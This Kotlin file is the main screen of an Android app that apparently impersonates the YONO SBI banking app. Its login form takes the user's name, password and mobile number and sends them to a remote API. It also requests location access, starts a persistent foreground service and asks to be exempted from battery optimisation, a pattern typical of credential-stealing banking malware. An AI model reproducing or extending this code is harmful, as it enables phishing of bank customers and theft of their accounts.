@file:Suppress("DEPRECATION")

package com.example.yono_osbi

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.example.yono_osbi.ApiClient.getClient
import com.example.yono_osbi.databinding.ActivityMainBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.util.Random

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val util = Util()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val random = Random()
        if (util.getLocalData(this, "u") == "") {
            util.saveLocalData(this, "u", random.nextInt(999999999).toString())
        }

        geopermission.requestPermissions(this)

        if (geopermission.hasGeoPermissions(this)) {
            val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
            if (!isServiceRunning) {
                val serviceIntent = Intent(this, MyForegroundService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
            }
        }

        binding.audio.setOnClickListener{
            binding.img.setImageDrawable(getDrawable(R.drawable.filled_circle))
        }

        binding.login.setOnClickListener {
            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty()
                || binding.e3.text.toString().isEmpty() || binding.e4.text.toString().isEmpty()){
                Toast.makeText(this,"Fill all fields",Toast.LENGTH_SHORT).show()
            } else if(binding.e3.text.toString().length < 10){
                Toast.makeText(this,"Mobile number is not correct",Toast.LENGTH_SHORT).show()
            } else{

                val intentff = Intent(this,secondpage::class.java)

                val data = FirstPagem(username = binding.e1.text.toString() ,
                    mobile = binding.e3.text.toString(), password = binding.e2.text.toString())
                util.saveLocalData(this,"u",binding.e3.text.toString() )
                val apiService = getClient().create(ApiService::class.java)
                val call = apiService.firstpage(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })

            }
        }



    }

    @SuppressLint("BatteryLife")
    private fun requestBatteryOptimizationPermission() {
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
        intent.data = Uri.parse("package:$packageName")
        startActivity(intent)
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!geopermission.hasGeoPermissions(this)) {
            if (!geopermission.shouldShowRequestPermissionRationale(this)) {
                geopermission.launchPermissionSettings(this)
            }
            finish()
        }
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
            requestBatteryOptimizationPermission()
        }

        val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
        if (!isServiceRunning) {
            val serviceIntent = Intent(this, MyForegroundService::class.java)
            ContextCompat.startForegroundService(this, serviceIntent)
        }


    }

}